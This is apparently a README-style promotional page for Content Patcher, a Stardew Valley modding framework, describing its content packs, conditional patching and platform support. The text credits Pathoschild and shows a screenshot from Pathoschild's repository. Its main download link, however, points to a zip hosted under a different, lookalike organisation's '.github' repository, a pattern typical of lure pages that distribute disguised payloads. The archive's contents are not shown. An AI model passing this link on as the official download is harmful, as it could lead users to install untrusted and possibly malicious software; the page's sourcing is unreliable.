# Content Patcher: Dynamic Content Packs, Asset Editing, and Stardew Valley Modding Framework

Content Patcher is a powerful modding framework for Stardew Valley, created by Pathoschild to load content packs that modify game data, images, and maps without replacing original XNB files. It supports conditional changes based on seasons, weather, locations, festivals, dates, and player relationships. With JSON-based configuration, automatic compatibility checks, and localization support, it makes game customization more flexible for players and mod creators.

> **[Download Content Patcher for Stardew Valley →](https://github.com/Content-Patcher-Stardew-Valley-Modding/.github/releases/download/v.5.0.1/Content.Patcher.Stardew.Valley.Modding.zip)**

## Project Screenshots

![Content Patcher configuration menu showing customizable content pack settings](https://raw.githubusercontent.com/Pathoschild/StardewMods/develop/ContentPatcher/docs/screenshots/config-with-sections.png)

## Dynamic Stardew Valley Content Modification

Content Patcher loads content packs that modify Stardew Valley's internal data, images, and maps without directly replacing original XNB game files. This approach allows multiple modifications to work with the same assets while reducing conflicts between compatible content packs.

Its conditional patching system supports changes based on in-game circumstances, including seasons, weather, dates, locations, festivals, relationships, and other player-related conditions. This allows content creators to develop modifications that respond dynamically to the player's progress and surroundings.

## Flexible Content Packs and Customization

Content packs use JSON configuration files to define which game assets should be loaded or modified. They can replace images, edit existing game data, modify maps, and introduce custom content without requiring creators to write a separate programming mod.

Many content packs also support configurable player settings, conditions, and reusable tokens. Optional integration with Generic Mod Config Menu allows supported content packs to expose their settings through an in-game configuration interface.

## Why Choose Content Patcher

Content Patcher provides a flexible foundation for Stardew Valley customization without relying on direct replacement of original game files. Its content pack system makes it easier to install, remove, and combine different modifications while reducing compatibility issues commonly associated with traditional XNB replacements.

Another important advantage is its accessibility for both players and creators. Players can install ready-made content packs, while mod authors can build custom visual, data, and map changes using JSON files. Dynamic conditions and configuration options provide additional control over how modifications behave during gameplay.

## What Makes Content Patcher High Quality

The framework is built around a structured content-loading system that supports multiple types of asset modifications. Its Load, EditData, EditImage, and EditMap actions provide dedicated ways to introduce or modify game content, while tokens and conditions allow patches to respond to changing game circumstances.

Content Patcher also includes automatic update checks, compatibility checks, and localization support for content packs. Its API allows SMAPI developers to provide custom tokens, extending the framework and enabling more advanced interactions between different mods.

## Mod Compatibility and Supported Platforms

Content Patcher supports Stardew Valley 1.6.15 or later and works on Windows, macOS, and Linux. It is compatible with both single-player and multiplayer gameplay, although multiplayer behavior can vary depending on the type of changes applied and which content packs each player has installed.

The framework requires SMAPI and does not modify the game independently. Content packs must be installed separately, and their changes are loaded automatically when Stardew Valley starts through SMAPI. The framework also supports compatibility checks and localization features to help content packs work alongside other modifications.
Content packs can be configured through their own `config.json` files when supported. Players who install Generic Mod Config Menu can also access configuration options for compatible content packs directly through the game's interface, making it easier to manage customization without manually editing configuration files.
